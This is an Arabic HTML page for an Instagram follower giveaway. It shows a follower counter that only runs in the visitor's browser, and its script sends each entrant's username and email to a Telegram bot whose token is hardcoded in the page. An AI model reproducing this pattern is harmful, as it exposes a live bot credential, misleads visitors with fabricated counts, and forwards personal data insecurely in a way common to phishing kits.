
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مسابقة المتابعين - كامل</title>
<style>
body {
    margin:0;
    padding:0;
    font-family: Arial, sans-serif;
    background-color: #000;
    color: #fff;
    display:flex;
    justify-content:center;
    align-items:flex-start;
    min-height:100vh;
    overflow-x:hidden;
}
.container {
    background: rgba(0,0,0,0.5);
    border-radius: 20px;
    padding: 30px;
    margin-top: 30px;
    width:90%;
    max-width:600px;
    text-align:center;
    box-shadow: 0 0 20px rgba(255,255,255,0.3);
}
.lang-select {
    position:absolute;
    top:20px;
    left:20px;
    background:rgba(255,255,255,0.1);
    color:white;
    border:none;
    padding:5px 10px;
    border-radius:8px;
    cursor:pointer;
}
.profile img {
    width:80px; height:80px;
    border-radius:50%;
    border:2px solid #ffb6ff;
}
.profile h2 {margin:10px 0 5px 0; font-size:24px;}
.slogan {font-size:18px; margin-bottom:15px; color:#ffb6ff; text-align:center;}
.follow-btn {
    padding: 15px 50px; font-size: 22px; border:none; border-radius: 50px;
    background: linear-gradient(90deg,#ff00ff,#8e2de2,#4a00e0);
    background-size: 300% 300%; color:white; cursor:pointer;
    box-shadow:0 0 20px rgba(255,255,255,0.5); transition:0.3s;
    animation: glowing 2s linear infinite; margin:10px 0;
}
@keyframes glowing {0%{background-position:0 0;} 50%{background-position:100% 0;} 100%{background-position:0 0;}}
.follow-btn:hover {transform: scale(1.1); box-shadow:0 0 40px rgba(255,255,255,0.8);}
#counter {margin-top:10px; font-size:18px; font-weight:bold;}
.progress-container {width:100%; background:#555; border-radius:20px; margin:10px 0; height:20px;}
.progress-bar {width:0%; height:100%; background:#ff00ff; border-radius:20px; transition: width 0.5s ease;}
.registration-frame {
    background: rgba(255,255,255,0.05);
    border-radius:15px;
    padding:20px;
    margin-top:20px;
    transition: all 0.5s ease;
    filter: brightness(0.6);
}
.registration-frame.active {
    filter: brightness(1);
    box-shadow: 0 0 30px rgba(255,0,255,0.7);
}
.registration-frame input, .registration-frame label, .registration-frame button {
    width:100%;
    margin:10px 0;
    padding:10px;
    border-radius:8px;
    border:none;
    font-size:16px;
}
.registration-frame button {
    background:#8e2de2; color:white; cursor:pointer;
    transition:0.3s;
}
.registration-frame button:hover {background:#4a00e0;}
.participants {margin-top:20px; width:100%; background: rgba(255,255,255,0.1); border-radius:15px; padding:15px; overflow-y:auto; max-height:200px;}
.participants h3 {text-align:center; color:#ffb6ff;}
.participants ul {list-style:none; padding:0; margin:0;}
.participants li {padding:5px; border-bottom:1px solid #444;}
.status-btn {margin-top:20px; padding:10px 25px; font-size:16px; border-radius:20px; border:none; background:red; color:#fff; cursor:default;}
.coin {position:absolute; font-size:24px; animation:fall 1.5s ease forwards;}
@keyframes fall {0%{transform: translateY(0) rotate(0deg); opacity:1;} 100%{transform: translateY(100vh) rotate(720deg); opacity:0;}}
</style>
</head>
<body>

<select id="language" class="lang-select">
    <option value="AR">العربية</option>
    <option value="EN">English</option>
    <option value="FR">Français</option>
</select>

<div class="container">
    <div class="profile">
        <img src="https://instagram.falg1-1.fna.fbcdn.net/v/t51.2885-19/123456789_abcdefg.jpg" alt="Profile">
        <h2>OUSSAMA ZEMMAL</h2>
    </div>

    <div class="slogan">🎉 تابعنا الآن وادخل السحب للفوز بجوائز مذهلة! 💎💰 تابع ستورياتنا أيضاً!</div>

    <button class="follow-btn" id="followBtn">تابعنا على إنستغرام</button>
    <div id="counter">المتابعين: 0</div>

    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="registration-frame" id="registrationFrame">
        <h3>سجل للمشاركة 🎉</h3>
        <input type="text" id="username" placeholder="اسم المستخدم" disabled>
        <input type="email" id="email" placeholder="البريد الإلكتروني" disabled>
        <label><input type="checkbox" id="agree" disabled /> أوافق على الاشتراك في المسابقة</label>
        <button id="submitBtn" disabled>اشترك الآن</button>
    </div>

    <div class="participants">
        <h3>المشاركون</h3>
        <ul id="participantsList"></ul>
    </div>

    <button class="status-btn" id="statusBtn">مغلق</button>
</div>

<script>
let counter = 0, maxCounter = 10000;
const counterEl = document.getElementById('counter'),
      progressBar = document.getElementById('progressBar'),
      followBtn = document.getElementById('followBtn'),
      registrationFrame = document.getElementById('registrationFrame'),
      usernameInput = document.getElementById('username'),
      emailInput = document.getElementById('email'),
      agreeInput = document.getElementById('agree'),
      submitBtn = document.getElementById('submitBtn'),
      statusBtn = document.getElementById('statusBtn'),
      participantsList = document.getElementById('participantsList');

followBtn.addEventListener('click', ()=>{
    if(counter >= maxCounter){
        alert("🚫 تم الوصول للحد الأقصى من المتابعين.");
        return;
    }
    window.open("https://www.instagram.com/oussama__zemmal/", "_blank");
    let confirmed = confirm("هل تابعت الحساب فعلاً؟");
    if(confirmed){
        counter++;
        counterEl.textContent = "المتابعين: " + counter;
        progressBar.style.width = (counter/maxCounter*100) + "%";
        statusBtn.textContent = "مفتوح";
        statusBtn.style.background = "green";

        registrationFrame.classList.add('active');
        usernameInput.disabled = false;
        emailInput.disabled = false;
        agreeInput.disabled = false;
        submitBtn.disabled = false;

        for(let i=0;i<15;i++){
            let coin = document.createElement('div');
            coin.innerText = "💰";
            coin.className = 'coin';
            coin.style.left = Math.random()*90+'%';
            document.body.appendChild(coin);
            setTimeout(()=>coin.remove(),1500);
        }

        if(counter >= maxCounter){
            followBtn.disabled = true;
            followBtn.style.opacity = 0.6;
        }
    } else {
        alert("يجب متابعة الحساب لاحتساب المشاركة.");
    }
});

submitBtn.addEventListener('click', ()=>{
    const username = usernameInput.value;
    const email = emailInput.value;
    const agree = agreeInput.checked;
    if(username && email && agree){
        let li = document.createElement('li');
        li.textContent = username + " (" + email + ")";
        participantsList.appendChild(li);

        const token = "8109828263:AAGrz26s5FbBjki8Rdk-ywVzCQEn6zXPZKo";
        const chat_id = "8109828263";
        const message = `🎉 تسجيل جديد!\nاسم المستخدم: ${username}\nالايميل: ${email}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
        .then(res => console.log("تم الإرسال إلى تيليغرام"))
        .catch(err => console.error("خطأ بالإرسال:", err));

        usernameInput.value='';
        emailInput.value='';
        agreeInput.checked = false;
        alert("✅ سيتم التواصل معك على الإيميل إذا ربحت الجائزة!");
    } else {
        alert("الرجاء تعبئة كل الحقول والموافقة على الاشتراك!");
    }
});
</script>
</body>
</html>
